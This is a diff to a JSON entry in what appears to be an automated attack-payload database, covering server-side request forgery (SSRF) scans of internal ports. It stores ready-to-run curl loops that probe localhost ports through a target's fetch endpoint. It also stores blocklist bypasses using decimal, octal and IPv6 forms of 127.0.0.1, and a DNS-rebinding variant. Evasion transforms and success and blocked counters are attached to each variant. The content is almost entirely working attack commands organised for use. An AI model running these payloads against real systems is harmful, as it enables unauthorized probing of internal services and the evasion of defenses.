@@ -2,34 +2,62 @@
   "id": "w004",
   "name": "SSRF 内网端口探测",
   "family": "web/ssrf",
-  "match": {"product": "any-web"},
+  "match": {
+    "product": "any-web"
+  },
   "variants": [
     {
       "vid": "v1",
       "desc": "直接 http://127.0.0.1:PORT 遍历",
       "command": "for p in 22 80 3306 6379 8080 9200; do curl -s 'http://TARGET/fetch?url=http://127.0.0.1:'$p; done",
-      "sig": ["127.0.0.1", "localhost"],
-      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "sig": [
+        "127.0.0.1",
+        "localhost"
+      ],
+      "stats": {
+        "tries": 0,
+        "ok": 0,
+        "blocked": 0,
+        "fail": 0
+      },
       "streak_fail": 0,
-      "confidence": 0.5
+      "confidence": 0.5,
+      "stack": []
     },
     {
       "vid": "v2",
       "desc": "十进制/八进制 IP + 短域名绕过黑名单",
       "command": "for u in http://2130706433:6379 http://0177.0.0.1:6379 http://127.1:6379 http://[::1]:6379; do curl -s \"http://TARGET/fetch?url=$u\"; done",
       "sig": [],
-      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "stats": {
+        "tries": 0,
+        "ok": 0,
+        "blocked": 0,
+        "fail": 0
+      },
       "streak_fail": 0,
-      "confidence": 0.5
+      "confidence": 0.5,
+      "stack": [
+        "tr.payload-morph"
+      ]
     },
     {
       "vid": "v3",
       "desc": "DNS 重绑定：先用可解析域名通过校验，再指向内网",
       "command": "# 需自备 rebind 域名；请求间隔 > 校验 TTL\ncurl -s 'http://TARGET/fetch?url=http://<rebind-domain>:6379'",
       "sig": [],
-      "stats": {"tries": 0, "ok": 0, "blocked": 0, "fail": 0},
+      "stats": {
+        "tries": 0,
+        "ok": 0,
+        "blocked": 0,
+        "fail": 0
+      },
       "streak_fail": 0,
-      "confidence": 0.5
+      "confidence": 0.5,
+      "stack": [
+        "tr.payload-morph",
+        "tr.jitter"
+      ]
     }
   ],
   "evasion": {
@@ -38,5 +66,7 @@
   },
   "notes": "先确认回显类型（直接返回内容 / 时间盲 / 报错回显），再选变体。",
   "created_at": "2026-11-15T00:00:00Z",
-  "updated_at": "2026-11-15T00:00:00Z"
+  "updated_at": "2026-11-15T00:00:00Z",
+  "attempts": [],
+  "derived": []
 }
